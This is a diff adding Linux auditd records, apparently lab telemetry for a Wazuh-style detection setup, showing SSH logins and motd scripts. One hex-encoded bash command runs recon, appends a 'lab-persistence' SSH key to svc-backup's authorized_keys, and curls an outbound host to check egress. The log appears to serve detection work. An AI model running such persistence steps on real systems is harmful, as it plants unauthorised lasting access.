@@ -1,0 +1,42 @@
+type=SYSCALL msg=audit(1793373739.993:10621): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7ffd4304e220 a2=4 a3=7ffd4304df34 items=0 ppid=9096 pid=10821 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=104 comm="sshd" exe="/usr/sbin/sshd" subj=unconfined key=(null)
+type=SYSCALL msg=audit(1793373740.021:10626): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7ffd800b1d90 a2=4 a3=7ffd800b1aa4 items=0 ppid=1 pid=10826 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=105 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)
+type=EXECVE msg=audit(1793373740.021:10628): argc=2 a0="/lib/systemd/systemd" a1="--user"
+type=EXECVE msg=audit(1793373740.029:10629): argc=1 a0="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
+type=EXECVE msg=audit(1793373740.033:10630): argc=2 a0="/bin/bash" a1="/usr/lib/systemd/user-environment-generators/90gpg-agent"
+type=EXECVE msg=audit(1793373740.033:10631): argc=3 a0="gpgconf" a1="--check-options" a2="gpg-agent"
+type=EXECVE msg=audit(1793373740.033:10632): argc=3 a0="awk" a1="-F:" a2=424547494E7B7265743D317D202F5E6770672D6167656E743A2F7B696620282435203D3D2022312229207B207265743D303B20657869742030207D207D20454E44207B65786974207265747D
+type=EXECVE msg=audit(1793373740.037:10633): argc=2 a0="gpg-agent" a1="--gpgconf-test"
+type=EXECVE msg=audit(1793373740.037:10634): argc=3 a0="gpgconf" a1="--list-options" a2="gpg-agent"
+type=EXECVE msg=audit(1793373740.037:10635): argc=3 a0="awk" a1="-F:" a2=2F5E656E61626C652D7373682D737570706F72743A2F7B207072696E7420243130207D
+type=EXECVE msg=audit(1793373740.037:10636): argc=2 a0="gpg-agent" a1="--dump-option-table"
+type=EXECVE msg=audit(1793373740.041:10637): argc=2 a0="gpg-agent" a1="--gpgconf-list"
+type=EXECVE msg=audit(1793373740.041:10638): argc=4 a0="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" a1="/run/user/1002/systemd/generator" a2="/run/user/1002/systemd/generator.early" a3="/run/user/1002/systemd/generator.late"
+type=EXECVE msg=audit(1793373740.105:10640): argc=3 a0="sh" a1="-c" a2=2F7573722F62696E2F656E76202D6920504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F62696E3A2F7573722F7362696E3A2F7573722F62696E3A2F7362696E3A2F62696E2072756E2D7061727473202D2D6C7362737973696E6974202F6574632F7570646174652D6D6F74642E64203E202F72756E2F6D6F74642E64796E616D69632E6E6577
+type=EXECVE msg=audit(1793373740.105:10641): argc=6 a0="/usr/bin/env" a1="-i" a2="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" a3="run-parts" a4="--lsbsysinit" a5="/etc/update-motd.d"
+type=SYSCALL msg=audit(1793373740.105:10642): arch=c000003e syscall=59 success=no exit=-2 a0=7fff80d087a0 a1=7fff80d08ae0 a2=56093021ec70 a3=7fff80d0ae80 items=1 ppid=10841 pid=10842 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=104 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=SYSCALL msg=audit(1793373740.105:10643): arch=c000003e syscall=59 success=no exit=-2 a0=7fff80d087a0 a1=7fff80d08ae0 a2=56093021ec70 a3=7fff80d0ae80 items=1 ppid=10841 pid=10842 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=104 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=SYSCALL msg=audit(1793373740.105:10644): arch=c000003e syscall=59 success=no exit=-2 a0=7fff80d087a0 a1=7fff80d08ae0 a2=56093021ec70 a3=7fff80d0ae80 items=1 ppid=10841 pid=10842 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=104 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=EXECVE msg=audit(1793373740.105:10645): argc=3 a0="run-parts" a1="--lsbsysinit" a2="/etc/update-motd.d"
+type=EXECVE msg=audit(1793373740.105:10646): argc=2 a0="/bin/sh" a1="/etc/update-motd.d/10-uname"
+type=EXECVE msg=audit(1793373740.105:10647): argc=2 a0="uname" a1="-snrvm"
+type=EXECVE msg=audit(1793373740.105:10648): argc=2 a0="/bin/sh" a1="/etc/update-motd.d/92-unattended-upgrades"
+type=EXECVE msg=audit(1793373740.105:10649): argc=2 a0="/bin/sh" a1="/usr/share/unattended-upgrades/update-motd-unattended-upgrades"
+type=SYSCALL msg=audit(1793373741.929:10659): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7fff90783880 a2=4 a3=7fff90783594 items=0 ppid=9096 pid=10847 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=106 comm="sshd" exe="/usr/sbin/sshd" subj=unconfined key=(null)
+type=EXECVE msg=audit(1793373741.949:10660): argc=3 a0="sh" a1="-c" a2=2F7573722F62696E2F656E76202D6920504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F62696E3A2F7573722F7362696E3A2F7573722F62696E3A2F7362696E3A2F62696E2072756E2D7061727473202D2D6C7362737973696E6974202F6574632F7570646174652D6D6F74642E64203E202F72756E2F6D6F74642E64796E616D69632E6E6577
+type=EXECVE msg=audit(1793373741.949:10661): argc=6 a0="/usr/bin/env" a1="-i" a2="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" a3="run-parts" a4="--lsbsysinit" a5="/etc/update-motd.d"
+type=SYSCALL msg=audit(1793373741.949:10662): arch=c000003e syscall=59 success=no exit=-2 a0=7ffdf3fe8540 a1=7ffdf3fe8880 a2=55799427fc70 a3=7ffdf3feae80 items=1 ppid=10849 pid=10850 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=106 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=SYSCALL msg=audit(1793373741.949:10663): arch=c000003e syscall=59 success=no exit=-2 a0=7ffdf3fe8540 a1=7ffdf3fe8880 a2=55799427fc70 a3=7ffdf3feae80 items=1 ppid=10849 pid=10850 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=106 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=SYSCALL msg=audit(1793373741.949:10664): arch=c000003e syscall=59 success=no exit=-2 a0=7ffdf3fe8540 a1=7ffdf3fe8880 a2=55799427fc70 a3=7ffdf3feae80 items=1 ppid=10849 pid=10850 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=106 comm="env" exe="/usr/bin/env" subj=unconfined key="audit-wazuh-c"
+type=EXECVE msg=audit(1793373741.949:10665): argc=3 a0="run-parts" a1="--lsbsysinit" a2="/etc/update-motd.d"
+type=EXECVE msg=audit(1793373741.953:10666): argc=2 a0="/bin/sh" a1="/etc/update-motd.d/10-uname"
+type=EXECVE msg=audit(1793373741.953:10667): argc=2 a0="uname" a1="-snrvm"
+type=EXECVE msg=audit(1793373741.953:10668): argc=2 a0="/bin/sh" a1="/etc/update-motd.d/92-unattended-upgrades"
+type=EXECVE msg=audit(1793373741.953:10669): argc=2 a0="/bin/sh" a1="/usr/share/unattended-upgrades/update-motd-unattended-upgrades"
+type=EXECVE msg=audit(1793373741.957:10672): argc=3 a0="bash" a1="-c" a2=0A69643B2077686F616D693B20756E616D65202D610A7375646F202D6E202D6C20323E2631207C2068656164202D310A6D6B646972202D70207E2F2E7373680A6563686F20227373682D65643235353139204141414143334E7A6143316C5A4449314E54453541414141494C61624F6E6C7950657273697374656E63654B6579206C61622D70657273697374656E636522203E3E207E2F2E7373682F617574686F72697A65645F6B6579730A6375726C202D73202D6F202F6465762F6E756C6C202D7720226F7574626F756E645F687474703D257B687474705F636F64657D5C6E2220687474703A2F2F31302E302E322E323A383038302F0A6563686F20504F53545F45585F444F4E450A
+type=EXECVE msg=audit(1793373741.961:10673): argc=1 a0="id"
+type=EXECVE msg=audit(1793373741.961:10674): argc=1 a0="whoami"
+type=EXECVE msg=audit(1793373741.961:10675): argc=2 a0="uname" a1="-a"
+type=EXECVE msg=audit(1793373741.961:10676): argc=2 a0="head" a1="-1"
+type=EXECVE msg=audit(1793373741.961:10677): argc=3 a0="sudo" a1="-n" a2="-l"
+type=EXECVE msg=audit(1793373741.965:10680): argc=3 a0="mkdir" a1="-p" a2="/home/svc-backup/.ssh"
+type=EXECVE msg=audit(1793373741.965:10681): argc=7 a0="curl" a1="-s" a2="-o" a3="/dev/null" a4="-w" a5="outbound_http=%{http_code}\n" a6="http://10.0.2.2:8080/"
